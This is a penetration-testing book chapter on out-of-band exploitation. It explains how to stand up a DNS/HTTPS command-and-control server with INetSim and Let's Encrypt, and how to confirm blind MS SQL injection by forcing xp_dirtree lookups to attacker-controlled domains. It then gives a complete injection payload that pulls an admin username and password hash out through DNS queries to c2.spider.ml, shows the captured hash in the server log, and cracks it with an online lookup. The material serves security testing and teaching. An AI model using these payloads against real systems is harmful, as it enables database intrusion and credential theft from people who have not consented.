<html><head></head><body><div class="chapter" title="Chapter&#xA0;6.&#xA0;Out-of-Band Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="ch06"/>Chapter 6. Out-of-Band Exploitation</h1></div></div></div><p>In the previous chapter, we looked at confirming and exploiting file inclusion attacks. The confirmation piece was straightforward, since the server immediately made it obvious that the application was vulnerable. What happens when things are not so clear? What if the server is vulnerable but does not show any indication of it when given unexpected input? When testing for the existence of, say, a SQL injection vulnerability, attackers will usually feed specially crafted values into the input and observe the application's behavior. Sometimes, if they are lucky, the server returns a bright-red SQL error message, which can indicate the existence of an injection point.</p><p>As applications and frameworks get more complex, production applications are hardened and the behavioral hints that we used to rely on to confirm a vulnerability are no longer as obvious. Modern applications tend to suppress error messages by default and may not always process the input synchronously. If our payload is executed by a backend batch job every eight hours, we would not see the effect in the HTTP response and could miss a potentially critical vulnerability.</p><p>
<span class="strong"><strong>Out-of-band</strong></span> vulnerability discovery is the process by which we can force the application to interact with an external service that we control. If an application is vulnerable to a SQL injection attack but there are no immediate hints during the initial scan, we can feed it a payload that tricks the application into communicating with our C2 server, just enough that it proves our payload was executed.</p><p>In this chapter, we will look at the following:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Creating a C2 server</li><li class="listitem" style="list-style-type: disc">Using <span class="strong"><strong>INetSim</strong></span> to emulate services</li><li class="listitem" style="list-style-type: disc">Confirming vulnerabilities using out-of-band techniques</li><li class="listitem" style="list-style-type: disc">Advanced data exfiltration</li></ul></div><div class="section" title="A common scenario"><div class="titlepage"><div><div><h1 class="title"><a id="ch06lvl1sec37"/>A common scenario</h1></div></div></div><p>Imagine<a id="id272" class="indexterm"/> that the application <code class="literal">http://vuln.app.internal/user.aspx?name=Dade</code> is vulnerable to a SQL injection attack on the <code class="literal">name</code> parameter. Traditional payloads and polyglots do not seem to affect the application's response. Perhaps database error messages are disabled and the <code class="literal">name</code> value is not processed synchronously by the application.</p><p>Somewhere on the backend <span class="strong"><strong>Microsoft SQL</strong></span> (<span class="strong"><strong>MS SQL</strong></span>) server, the following query is executed:</p><div class="informalexample"><pre class="programlisting">SELECT * FROM users WHERE user = '<span class="strong"><strong>Dade</strong></span>';</pre></div><p>A simple single-quote value for <code class="literal">name</code> would produce a SQL error and we'd be in business, but in this case, the error messages are suppressed, so from a client perspective, we'd have no idea something went wrong. Taking it a step further, we can force the application to delay the response by a significant amount of time to confirm the vulnerability:</p><div class="informalexample"><pre class="programlisting">SELECT * FROM users WHERE user = 'Dade';<span class="strong"><strong>WAITFOR DELAY '0:0:20' --</strong></span>';</pre></div><p>This payload injects a 20 second delay into the query return, which is noticeable enough that it would raise some flags, but the query is executed asynchronously. That is, the application responds to us before the query has completed because it probably doesn't depend on the result.</p><p>This is where forcing an out-of-band service interaction comes in handy while hunting for obscure vulnerabilities. Instead of the <code class="literal">WAITFOR DELAY</code> payload, the following will force an MS SQL server to connect to an arbitrary <a id="id273" class="indexterm"/>host over the <span class="strong"><strong>Server Message Block</strong></span> (<span class="strong"><strong>SMB</strong></span>) protocol, a host that we control:</p><div class="informalexample"><pre class="programlisting">';declare @q varchar(99);set <span class="strong"><strong>@q</strong></span>=<span class="strong"><strong>'\\attacker.c2\test'</strong></span>; exec master.dbo.xp_dirtree <span class="strong"><strong>@q</strong></span>;--</pre></div><p>While unusual, the payload is fairly simple to understand, even for those of us who don't work with SQL every day. The code will:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">Allocate space for a string variable <code class="literal">@q</code> (type <code class="literal">varchar</code>, length <code class="literal">99</code> bytes)</li><li class="listitem">Set the <code class="literal">@q</code> variable<a id="id274" class="indexterm"/> value to a <span class="strong"><strong>Universal Naming Convention</strong></span> (<span class="strong"><strong>UNC</strong></span>) path pointing to our server: <code class="literal">\\attacker.c2\test</code></li><li class="listitem">Execute a directory listing of the UNC path stored in <code class="literal">@q</code></li></ol></div><p>The server may or may not be able to negotiate an SMB connection to our server and grab a list of files. Whether or not the SMB protocol communication was successful is irrelevant. If we have control over the <code class="literal">attacker.c2</code> domain, we almost immediately have proof of the SQL injection. This is true for many other types of vulnerabilities that are hard to discover with traditional scanning. <span class="strong"><strong>XML External Entity</strong></span> (<span class="strong"><strong>XXE</strong></span>) attacks, for example, can <a id="id275" class="indexterm"/>also be<a id="id276" class="indexterm"/> confirmed out-of-band using the exact same methodology. Some XSS vulnerabilities are not always obvious from the attacker's point of view. Injected JavaScript code may only show up in a control panel that is never presented to the attacker, but once an administrator logs on, the exploit triggers. This could be hours, maybe days after the payload was injected. Out-of-band discovery and exploitation would alert the attacker as soon as the payload executes.</p><p>Before we get ahead of ourselves, we need proper C2 infrastructure to help us to verify some of these vulnerabilities. The C2 needs to not only accept connections from our target application, but also DNS queries. On the off chance that the application backend is firewalled on the egress ruleset, it will not be able to negotiate an SMB handshake. DNS queries over UDP port <code class="literal">53</code>, on the other hand, are almost always allowed outbound. Even if the application is not allowed to connect to our server directly, by design, DNS servers on the target network will proxy the resolution request until it reaches our server.</p></div></div>
<div class="section" title="Command and control"><div class="titlepage"><div><div><h1 class="title"><a id="ch06lvl1sec38"/>Command and control</h1></div></div></div><p>There are many<a id="id277" class="indexterm"/> cloud providers and thanks to competition, they are <a id="id278" class="indexterm"/>fairly cheap. We don't need a beefy machine: we can get away with a micro instance from any of these providers:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Google Cloud</li><li class="listitem" style="list-style-type: disc">Amazon AWS</li><li class="listitem" style="list-style-type: disc">Microsoft Azure</li><li class="listitem" style="list-style-type: disc">DigitalOcean</li></ul></div><p>Google Cloud and Amazon AWS have tiers that provide you with all the VM resources you need for free; for a limited time, of course. However, the few dollars a month it costs to run VMs in the cloud is well worth it for those of us who rely on C2 infrastructure.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note22"/>Note</h3><p>These C2 instances should also be a per-client deployment and the disks should be encrypted. Due to the nature of our work, sensitive customer data may flow in and could be stored insecurely. Once an engagement is complete, destroy the instance, along with any client data it may have collected.</p></div></div><p>Once the VM is up and running, it is usually assigned an ephemeral external IP address. In some cases, you can request a static IP, but this is generally not required. Ephemeral external IPs will remain unchanged while the VM is powered on.</p><div class="mediaobject"><img src="graphics/B09238_06_01.jpg" alt="Command and control"/><div class="caption"><p>Figure 6.1: The c2.spider.ml VM instance is up and running in Google Cloud</p></div></div><p>Make note of the external IP, as<a id="id279" class="indexterm"/> this VM will have to be the authoritative<a id="id280" class="indexterm"/> <span class="strong"><strong>nameserver </strong></span>(<span class="strong"><strong>NS</strong></span>) for the C2 domain. We can use any domain, or subdomain for that matter, that we control.</p><p>In the following example, the authoritative zone <code class="literal">spider.ml</code> delegates the C2 subdomain to our VM's IP. A record is required (<code class="literal">ns1.spider.ml</code>) for the NS, as you cannot delegate directly to an IP address.</p><div class="mediaobject"><img src="graphics/B09238_06_02.jpg" alt="Command and control"/><div class="caption"><p>Figure 6.2: The zone configuration and the delegation of c2.spider.ml to our C2 instance's IP</p></div></div><p>With these two records, queries for <code class="literal">c2.spider.ml</code> will effectively be sent to the C2 server we've just created. Any<a id="id281" class="indexterm"/> query for a subdomain of <code class="literal">c2.spider.ml</code> will <a id="id282" class="indexterm"/>also be sent to this IP address for resolution.</p><p>This is important, as we have to be able to see all the connection requests for <code class="literal">c2.spider.ml</code>. There are a couple of ways to do this; the traditional way being configuring a <span class="strong"><strong>BIND</strong></span> service with authority over the newly delegated zone: <code class="literal">c2.spider.ml</code>. For less complex C2 infrastructure, there is a simpler-to-configure alternative, with many other features.</p></div>
<div class="section" title="Let&#x2019;s Encrypt Communication"><div class="titlepage"><div><div><h1 class="title"><a id="ch06lvl1sec39"/>Let’s Encrypt Communication</h1></div></div></div><p>In order to provide some transport security, we may want spawn an HTTPS server or maybe use SMTPS. We could use self-signed certificates, but this is not ideal. Clients become suspicious when the TLS alert pops up on their browser, or network proxies may drop the connection altogether. We want to use a certificate which is signed by a trusted root certificate authority. There are countless paid services which offer all manner of TLS certificates, but the easiest and most cost effective is Let’s Encrypt.</p><p>Let’s Encrypt, a root certificate authority trusted by most clients, allows server administrators to request free, domain-validated certificates for their hosts. Their mission is to help move us towards an encrypted internet, and free certificates is a great step forward.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note23"/>Note</h3><p>Let’s Encrypt provides free domain-validated certificates for hostnames and even wildcard certificates. More information can be found on <a class="ulink" href="https://letsencrypt.org/">https://letsencrypt.org/</a>.</p></div></div><p>For demonstration purposes, our C2 will be hosted under the <code class="literal">spider.ml</code> domain and we will request a wildcard certificate.</p><p>First step is to download the <code class="literal">certbot-auto</code> wrapper script which installs dependencies and automates a lot of Let’s Encrypt’s certificate request process. On Debian distributions such as Kali, this script is available from:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~# wget https://dl.eff.org/certbot-auto</strong></span>
<span class="strong"><strong>[...]</strong></span>
<span class="strong"><strong>root@spider-c2-1:~# chmod +x certbot-auto </strong></span>
</pre></div><p>Certbot does have the option to automatically update web server configuration but for our purposes, we will do a manual request. This will drop the new certificate somewhere on disk and we can use it as we please.</p><p>The <code class="literal">--manual</code> switch will allow us to walk through a request with custom options. We will specify which domains the certificate is valid for using the <code class="literal">-d</code> switch. For wildcard certificates, we have to specify the parent domain <code class="literal">spider.ml</code> and the wildcard as well, <code class="literal">*.spider.ml</code>.</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# ./certbot-auto certonly --manual -d <span class="strong"><strong>*.spider.ml</strong></span> -d <span class="strong"><strong>spider.ml</strong></span> --preferred-challenges dns-01 --server https://acme-v02.api.letsencrypt.org/directory</pre></div><p>For wildcard domains, we will use the DNS challenge, meaning we will have to add a custom TXT record in order for Let’s Encrypt to be able to verify that we actually own this the parent domain.</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# ./certbot-auto certonly --manual -d <span class="strong"><strong>*.spider.ml</strong></span> -d <span class="strong"><strong>spider.ml</strong></span> --preferred-challenges dns-01 --server https://acme-v02.api.letsencrypt.org/directory
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Plugins selected: Authenticator manual, Installer None
Obtaining a new certificate
Performing the following challenges:
<span class="strong"><strong>dns-01 challenge for spider.ml</strong></span>
<span class="strong"><strong>dns-01 challenge for spider.ml</strong></span>
[...]</pre></div><p>The certbot wizard will eventually prompt us to create a <code class="literal">TXT</code> record <code class="literal">_acme-challenge.spider.ml</code> using a randomly generated nonce.</p><div class="informalexample"><pre class="programlisting">Please deploy a DNS TXT record under the name
_acme-challenge.spider.ml with the following value:

<span class="strong"><strong>dGhlIG9ubHkgd2lubmluZyBtb3ZlIGlzIG5vdCB0byBwbGF5</strong></span>

Before continuing, verify the record is deployed.
---------------------------------------------------------------------
Press Enter to Continue</pre></div><p>Before pressing <span class="emphasis"><em>Enter</em></span>, we have to add the record in the DNS manager for <code class="literal">spider.ml</code>:</p><div class="mediaobject"><img src="graphics/B09238_06_03.jpg" alt="Let’s Encrypt Communication"/><div class="caption"><p>Figure 6.3 : Adding a TXT DNS record</p></div></div><p>The wizard may prompt you again to update the <code class="literal">TXT</code> value to something new, in which case you may have to wait a few minutes before continuing. A low TTL value such as 5 minutes or less will help with the wait.</p><p>If everything is in order and Let’s Encrypt was able to verify the <code class="literal">TXT</code> records, a new certificate will be issues and stored on disk somewhere in <code class="literal">/etc/letsencrypt/live/</code>:</p><div class="informalexample"><pre class="programlisting">Waiting for verification...
Cleaning up challenges

IMPORTANT NOTES:
 - Congratulations! Your certificate and chain have been saved at:
   <span class="strong"><strong>/etc/letsencrypt/live/spider.ml/fullchain.pem</strong></span>
   Your key file has been saved at:
   <span class="strong"><strong>/etc/letsencrypt/live/spider.ml/privkey.pem</strong></span>
[...]

root@spider-c2-1:~#</pre></div><p>These certificates are only valid for a few months at a time, as per Let’s Encrypt policy. You will have to renew these using a similar process as the initial request. Certbot keeps a record of requested certificates and their expiry dates. Issuing a renew command will iterate through our certificates and automatically renew them.</p><p>These PEM files can now be used in Apache, NGINX, INetSim or any other web server we stand-up for command and control.</p><p>We can point our INetSIM instance to the newly minted certificates by adjusting the configuration file. The options to look for are <code class="literal">https_ssl_keyfile</code> which points to the private key, and <code class="literal">https_ssl_certfile</code> which is the certificate itself.</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# grep https_ssl /etc/inetsim/inetsim.conf 
# https_ssl_keyfile
# Syntax: https_ssl_keyfile &lt;filename&gt;
<span class="strong"><strong>https_ssl_keyfile       privkey.pem</strong></span>
# https_ssl_certfile
# Syntax: https_ssl_certfile &lt;filename&gt;
<span class="strong"><strong>https_ssl_certfile      fullchain.pem</strong></span>
[...]</pre></div><p>INetSIM looks for these files in the <code class="literal">certs</code> directory which is typically located under <code class="literal">/usr/share/inetsim/data</code>/.</p><p>The next step is to copy the <code class="literal">privkey.pem</code> and <code class="literal">fullchain.pem</code> files from the Let’s Encrypt <code class="literal">live</code> directory to the INetSIM <code class="literal">certs</code> directory. We will have to remember to do this whenever we renew the certificates. Automation through <code class="literal">crontab</code> is also an option.</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# cp <span class="strong"><strong>/etc/letsencrypt/live/spider.ml/fullchain.pem /usr/share/inetsim/data/certs/</strong></span>
root@spider-c2-1:~# cp <span class="strong"><strong>/etc/letsencrypt/live/spider.ml/privkey.pem /usr/share/inetsim/data/certs/</strong></span>
</pre></div><p>We should probably try to secure the private key as much as possible as well. We will set the owner of the file to <code class="literal">inetsim</code> and trim the permissions for all other users using <code class="literal">chmod</code>:</p><div class="informalexample"><pre class="programlisting">root@spider-c2-1:~# chown <span class="strong"><strong>inetsim:inetsim</strong></span> /usr/share/inetsim/data/certs/privkey.pem
root@spider-c2-1:~# chmod <span class="strong"><strong>400</strong></span> /usr/share/inetsim/data/certs/privkey.pem</pre></div><p>We can now enable the simulated HTTPS service and test the certificate validity:</p><div class="mediaobject"><img src="graphics/B09238_06_04.jpg" alt="Let’s Encrypt Communication"/><div class="caption"><p>Figure 6.4 : C2 HTTPS certificate provided by Let's Encrypt</p></div></div></div>
<div class="section" title="INet simulation"><div class="titlepage"><div><div><h1 class="title"><a id="ch06lvl1sec40"/>INet simulation</h1></div></div></div><p>To keep things simple, we will use <a id="id283" class="indexterm"/>INetSim to emulate a variety of <a id="id284" class="indexterm"/>network services. It quickly sets up listeners for a slew of known ports and even provides default responses using the appropriate protocol. For example, an FTP service can be started, which will accept any credentials and will allow the connectee to interact with the service: upload, download, list files, and so on.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note24"/>Note</h3><p>INetSim binaries, source, and <a id="id285" class="indexterm"/>documentation is available on <a class="ulink" href="http://www.inetsim.org/">http://www.inetsim.org/</a>.</p></div></div><p>INetSim is frequently <a id="id286" class="indexterm"/>used on closed networks to fake C2 servers for malware, and to capture valuable data. We can leverage the same INetSim tool to quickly<a id="id287" class="indexterm"/> setup a simple infrastructure that will handle connections from our targets, with the added benefit of producing a report of each session.</p><p>On our Debian VM instance in the cloud, we can add the official package repository for a quick install using the following <code class="literal">echo</code> command:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~# echo "deb http://www.inetsim.org/debian/binary/" &gt; /etc/apt/sources.list.d/inetsim.list</strong></span>
<span class="strong"><strong>root@spider-c2-1:~#</strong></span>
</pre></div><p>To keep Debian's <code class="literal">apt</code> from complaining during installation, we can fetch the signing key using the <code class="literal">wget</code> command. We will pipe the response to the <code class="literal">apt-key</code> in order to add it to our keychain:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~# wget -O - https://www.inetsim.org/inetsim-archive-signing-key.asc | apt-key add -</strong></span>
<span class="strong"><strong>[...]</strong></span>
<span class="strong"><strong>(464 MB/s) - written to stdout [2722/2722]</strong></span>
<span class="strong"><strong>OK</strong></span>
<span class="strong"><strong>root@spider-c2-1:~#</strong></span>
</pre></div><p>The next step is to grab the <code class="literal">inetsim</code> package from the newly installed <code class="literal">apt</code> repository and install it.</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~# apt-get update &amp;&amp; apt-get install inetsim</strong></span>
<span class="strong"><strong>[...]</strong></span>
<span class="strong"><strong>root@spider-c2-1:~#</strong></span>
</pre></div><p>The INetSim default configuration may be a bit too much for our purposes. Services such as FTP, which allow arbitrary credentials and provide upload support, should not be enabled on the internet.</p><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note25"/>Note</h3><p>INetSim is a great tool, but <a id="id288" class="indexterm"/>use with care. If the C2 server you are building is intended for a long-term engagement, it is better to use a proper daemon for each service you are intercepting.</p></div></div><p>We can go ahead and<a id="id289" class="indexterm"/> disable services that we will not need by editing the <code class="literal">/etc/inetsim/inetsim.conf</code> file. We can prepend each <code class="literal">start_service</code> line we wish to disable with a pound sign (<code class="literal">#</code>), as shown:</p><div class="mediaobject"><img src="graphics/B09238_06_05.jpg" alt="INet simulation"/><div class="caption"><p>Figure 6.5: Editing the INetSim configuration file to enable only DNS, HTTP, and HTTPS simulation</p></div></div><p>The default DNS configuration will <a id="id290" class="indexterm"/>also have to be altered to match the <code class="literal">c2.spider.ml </code>delegated zone. The <code class="literal">dns_default_ip</code> value should point to the C2 external IP, as we want HTTP traffic to be redirected there as well.</p><p>The <code class="literal">dns_default_hostname</code> value will be set to the zone subdomain <code class="literal">c2</code>, while the <code class="literal">dns_default_domainname</code> value will be the <code class="literal">spider.ml </code>parent domain. This essentially tells INetSim to respond to any queries in that zone with the <code class="literal">dns_default_ip</code> value. </p><p>This will be useful in our out-of-band vulnerability discovery and has other uses, as we will see later on.</p><div class="mediaobject"><img src="graphics/B09238_06_06.jpg" alt="INet simulation"/><div class="caption"><p>Figure 6.6: The dns_default_* settings modified in the /etc/inetsim/inetsim.conf configuration file</p></div></div><p>By default, INetSim<a id="id291" class="indexterm"/> responds to requests with default "fake" data for<a id="id292" class="indexterm"/> whatever protocol is being queried. These "fake" files are stored in <code class="literal">/var/lib/inetsim</code> and they're fairly descriptive. To be a bit more stealthy, we should at least add some innocuous text to the default HTTP responses.</p><p>The following <code class="literal">echo</code> command will replace the contents of the sample HTTP files with benign JavaScript code:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~# echo 'console.log("1");' &gt; /var/lib/inetsim/http/fakefiles/sample.html</strong></span>
<span class="strong"><strong>root@spider-c2-1:~# echo 'console.log("2");' &gt; /var/lib/inetsim/http/wwwroot/index.html</strong></span>
</pre></div><p>To get our simple C2 server online, we have to start the INetSim daemon and tell it to bind service listeners to <code class="literal">0.0.0.0</code>, using the <code class="literal">--bind-address</code> switch, as shown:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~# inetsim --bind-address=0.0.0.0</strong></span>
<span class="strong"><strong>INetSim 1.2.7 by Matthias Eckert &amp; Thomas Hungenberg</strong></span>
<span class="strong"><strong>[...]</strong></span>
<span class="strong"><strong> Forking services...</strong></span>
<span class="strong"><strong>  * dns_53_tcp_udp - started (PID 4110)</strong></span>
<span class="strong"><strong>  * https_443_tcp - started (PID 4112)</strong></span>
<span class="strong"><strong>  </strong></span>
<span class="strong"><strong>* http_80_tcp - started (PID 4111)</strong></span>
<span class="strong"><strong> done.</strong></span>
<span class="strong"><strong>Simulation running.</strong></span>
</pre></div><p>We can test the DNS server provided by INetSim by either browsing to a random subdomain within the scope of the delegated domain, or by issuing a <code class="literal">dig</code> query from our attack Kali machine:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@kali:~# dig +short c2FudGEgY2xhdXNlIGlzIG5vdCByZWFs.c2.spider.ml</strong></span>
<span class="strong"><strong>35.196.100.89</strong></span>
</pre></div><p>This is the path our DNS query takes through the internet:</p><div class="orderedlist"><ol class="orderedlist arabic"><li class="listitem">The client asks their local DNS servers for an answer</li><li class="listitem">Local DNS server forwards to the internet root name servers</li><li class="listitem">Root servers will forward the query to the authority for the ML top-level domain</li><li class="listitem">The ML authority will forward the query to the <code class="literal">spider.ml</code> authority</li><li class="listitem">The NS record that we've added earlier will forward the query to our C2 server</li></ol></div><p>Since we control this <a id="id293" class="indexterm"/>DNS server <a id="id294" class="indexterm"/>responsible for the <code class="literal">c2</code> zone, we can inspect <code class="literal">/var/log/inetsim/service.log</code> and observe the response sent to the <code class="literal">dig</code> request, using the <code class="literal">tail</code> command as shown:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>root@spider-c2-1:~# tail /var/log/inetsim/service.log</strong></span>
<span class="strong"><strong>[...] [11033] [dns_53_tcp_udp 11035] connect</strong></span>
<span class="strong"><strong>[...] [11033] [dns_53_tcp_udp 11035] recv: Query Type A, Class IN, Name c2FudGEgY2xhdXNlIGlzIG5vdCByZWFs.c2.spider.ml</strong></span>
<span class="strong"><strong>[...] [11033] [dns_53_tcp_udp 11035] send: c2FudGEgY2xhdXNlIGlzIG5vdCByZWFs.c2.spider.ml 3600 IN A 35.196.100.89</strong></span>
<span class="strong"><strong>[...] [11033] [dns_53_tcp_udp 11035] disconnect</strong></span>
<span class="strong"><strong>[...] [11033] [dns_53_tcp_udp 11035] stat: 1 qtype=A qclass=IN qname=c2FudGEgY2xhdXNlIGlzIG5vdCByZWFs.c2.spider.ml</strong></span>
<span class="strong"><strong>root@spider-c2-1:~#</strong></span>
</pre></div><p>The C2 infrastructure is ready for out-of-band vulnerability discovery scans.</p></div>
<div class="section" title="The confirmation"><div class="titlepage"><div><div><h1 class="title"><a id="ch06lvl1sec41"/>The confirmation</h1></div></div></div><p>Now that the <a id="id295" class="indexterm"/>cloud server is properly configured to record incoming requests over DNS, we can go back to our earlier example and leverage the cloud to confirm the vulnerability out-of-band.</p><p>You'll recall that the vulnerable application allows unsanitized input to be executed on the SQL server via the <code class="literal">name</code> parameter. The challenge we sometimes face, as attackers, is the difficulty in confirming the existence of this type of vulnerability when the application does not behave differently based on the input given. Sometimes, we may even be lucky enough to examine source code, in which case we'd just skip right to exploiting the vulnerability.</p><p>The <code class="literal">WAITFOR DELAY</code> payload will work for most blind SQL injections, as the majority of application views depend on the result from SQL queries that the controller executes.</p><div class="informalexample"><pre class="programlisting">SELECT * FROM users WHERE user = 'Dade';<span class="strong"><strong>WAITFOR DELAY '0:0:20' --</strong></span>';</pre></div><p>In the surprisingly common scenario where the vulnerable query is executed asynchronously and the page does not return any useful information, we can trick the SQL server into contacting our newly created C2 infrastructure and get confirmation without the application's help.</p><p>The payload to accomplish this will look like the following:</p><div class="informalexample"><pre class="programlisting">';declare @q varchar(99);set @q='\\sqli-test-payload-1.c2.spider.ml\test'; exec master.dbo.xp_dirtree @q;--</pre></div><p>When the backend system builds the query for execution, it will translate into the following:</p><div class="informalexample"><pre class="programlisting">SELECT * FROM users WHERE user = 'Dade';<span class="strong"><strong>declare @q varchar(99);set @q='\\sqli-test-payload-1.c2.spider.ml\test'; exec master.dbo.xp_dirtree @q;--</strong></span>';</pre></div><p>Once again, if we inspect the <code class="literal">/var/log/inetsim/service.log</code> file on our C2 server, we can see the query coming in from the SQL server backend in an attempt to resolve the <code class="literal">sqli-test-payload-1.c2.spider.ml</code> domain before the directory listing of the share can be carried out:</p><div class="informalexample"><pre class="programlisting">[1438] [dns_53_tcp_udp 1441] connect
[1438] [dns_53_tcp_udp 1441] recv: Query Type A, Class IN, Name <span class="strong"><strong>sqli-test-payload-1.c2.spider.ml</strong></span>
[1438] [dns_53_tcp_udp 1441] send: sqli-test-payload-1.c2.spider.ml 3600 IN A<span class="strong"><strong> 35.196.100.89</strong></span>
[1438] [dns_53_tcp_udp 1441] disconnect</pre></div><p>We've forced the application to make a DNS query to a server that we control. Seeing the very specific query in the C2 logs, we're able to confirm that there is an exploitable SQL injection vulnerability.</p></div>
<div class="section" title="Async data exfiltration"><div class="titlepage"><div><div><h1 class="title"><a id="ch06lvl1sec42"/>Async data exfiltration</h1></div></div></div><p>There is one more challenge <a id="id296" class="indexterm"/>with this particular type of vulnerability. Its asynchronous nature makes it impossible to use traditional methods for data exfiltration. While the query may execute successfully and the SQL server will delay the query result, we'd never be able to measure this, as the application that we are targeting does not wait for the SQL server response and returns immediately.</p><p>We have to be a bit more clever to extract data and successfully compromise the target. MS SQL server, MySQL, PostgreSQL, and others all have ways to accomplish our goal. We'll just go over an MS SQL method, but with a little creativity, any database engine can bend to the attacker's will. It's also important to remember that this method can be used when confirming not just SQL injection vulnerabilities but also XSS and XXE, discussed in other chapters of this book.</p><p>Let's go ahead and revisit the method we've used to confirm the vulnerability in the first place. We've passed in a query that forced the SQL server to resolve an arbitrary domain name in an attempt to list the contents of a network share over SMB. Since we control the DNS server that has authority over the share domain, we can intercept any query sent to it. Confirmation was just a matter of observing the application server attempting to resolve the domain for the network share we passed in. To actually get the data out, we'll have to build a query that performs these actions:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem" style="list-style-type: disc">Selects one high-value user by role (<code class="literal">admin</code>)</li><li class="listitem" style="list-style-type: disc">Selects that user's password</li><li class="listitem" style="list-style-type: disc">Concatenates the two values with a period: <code class="literal">[admin].[hash]</code></li><li class="listitem" style="list-style-type: disc">Prepends that value to the <code class="literal">c2.spider.ml</code> domain</li><li class="listitem" style="list-style-type: disc">Forces a DNS query</li></ul></div><p>Similar to our first payload, we will declare a variable <code class="literal">@q</code>, which will store the data we will be pulling from the database:</p><div class="informalexample"><pre class="programlisting">declare @q varchar(99);</pre></div><p>Next, we will use a couple of <code class="literal">SELECT</code> statements to read the <code class="literal">user</code> field for the first account with the <code class="literal">admin</code> role:</p><div class="informalexample"><pre class="programlisting">select top 1 user from users where role = 'admin'</pre></div><p>We will also select the <code class="literal">password</code> field for this particular user:</p><div class="informalexample"><pre class="programlisting">select top 1 password from users where role = 'admin'</pre></div><p>In order to exfiltrate this data, we need to concatenate the two values using MS SQL's <code class="literal">CONCAT()</code> function:</p><div class="informalexample"><pre class="programlisting">select concat((select top 1 user from users where role = 'admin'),'.',(select top 1 password from users where role = 'admin'))</pre></div><p>The result of the concatenation will be stored in the <code class="literal">@q</code> variable, as shown:</p><div class="informalexample"><pre class="programlisting">set @q=(select concat((select top 1 user from users where role = 'admin'),'.',(select top 1 password from users where role = 'admin')));</pre></div><p>Finally, we execute the <code class="literal">xp_fileexist</code> MS SQL function to force a DNS and SMB request to our C2 server, with the contents of <code class="literal">@q</code> as the subdomain:</p><div class="informalexample"><pre class="programlisting">exec('xp_fileexist <span class="strong"><strong>''\\'+@q+'.c2.spider.ml\test''</strong></span>');--'</pre></div><p>The confusing double and<a id="id297" class="indexterm"/> single quotes preceding the double backslash is just the Windows way to escape the single quote.</p><p>The final payload is a bit messy but should do the trick. We will combine all of our statements into one line, with each statement separated by a semicolon:</p><div class="informalexample"><pre class="programlisting">';declare @q varchar(99);set @q=(select concat((select top 1 user from users where role = 'admin'),'.',(select top 1 password from users where role = 'admin'))); exec('xp_fileexist <span class="strong"><strong>''\\'+@q+'.c2.spider.ml\test''</strong></span>');--</pre></div><p>On the backend, the SQL query to be executed will look like the following:</p><div class="informalexample"><pre class="programlisting">SELECT * FROM users WHERE user = 'Dade';<span class="strong"><strong>declare @q varchar(99);set @q=(select concat((select top 1 user from users where role = 'admin'),'.',(select top 1 password from users where role = 'admin'))); exec('xp_fileexist ''\\'+@q+'.c2.spider.ml\test''');--</strong></span>';</pre></div><p>Just as with the out-of-band confirmation, we've declared a variable whose value will be the concatenated administrative username and its respective password hash. The final command instructs the SQL server to execute the <code class="literal">xp_fileexist</code> command through the <code class="literal">EXEC()</code> MS SQL function. As before, we don't care about the result; we just want to force the server to issue a DNS query for the domain we control.</p><p>The C2 server should have received a DNS query containing the credentials extracted from the database in the form of a domain name:</p><div class="informalexample"><pre class="programlisting">
<span class="strong"><strong>[...] [1438] [dns_53_tcp_udp 1441] connect</strong></span>
<span class="strong"><strong>[...] [1438] [dns_53_tcp_udp 1441] recv: Query Type AAAA, Class IN, Name administrator.a7b0d65fdf1728307f896e83c306a617.c2.spider.ml</strong></span>
<span class="strong"><strong>[...] [1438] [dns_53_tcp_udp 1441] disconnect</strong></span>
<span class="strong"><strong>[...] [1438] [dns_53_tcp_udp 1441] stat: 1 qtype=AAAA qclass=IN </strong></span>
<span class="strong"><strong>qname=administrator.a7b0d65fdf1728307f896e83c306a617.c2.spider.ml</strong></span>
</pre></div><p>Great! Now all we have to<a id="id298" class="indexterm"/> do is "crack" the hash. We could launch <span class="strong"><strong>John the Ripper</strong></span> or <span class="strong"><strong>hashcat</strong></span> to perform a dictionary or brute-force attack, or we can check whether this value was already computed.</p><div class="mediaobject"><img src="graphics/B09238_06_07.jpg" alt="Async data exfiltration"/><div class="caption"><p>Figure 6.7: A quick search on Hashtoolkit.com for the retrieved password hash with the value "summer17" popping up in the results</p></div></div><div class="note" title="Note" style=""><div class="inner"><h3 class="title"><a id="note26"/>Note</h3><p>Hash Toolkit lets you run searches for MD5 and SHA-* hashes to quickly return their plaintext counterparts. The most common passwords have already been cracked or computed by somebody somewhere and sites like Hash Toolkit provide a quick index for the results. As with anything on the internet, be aware of what data you submit to an untrusted medium. Hash Toolkit is available <a id="id299" class="indexterm"/>on <a class="ulink" href="https://hashtoolkit.com/">https://hashtoolkit.com/</a>.</p></div></div></div>
